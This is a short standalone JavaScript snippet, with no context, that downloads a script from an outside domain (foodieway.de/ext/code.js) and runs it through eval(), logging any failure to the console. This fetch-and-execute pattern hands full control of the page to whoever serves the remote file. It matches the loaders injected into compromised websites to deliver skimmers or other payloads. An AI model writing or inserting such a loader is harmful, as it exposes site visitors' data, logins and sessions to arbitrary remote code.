(function() {
  const url = 'https://foodieway.de/ext/code.js'; 
  fetch(url)
  .then(response => response.text())
  .then(code => {
    eval(code);
  })
  .catch(error => {
    console.error('Error loading the JavaScript code:', error);
  });
})();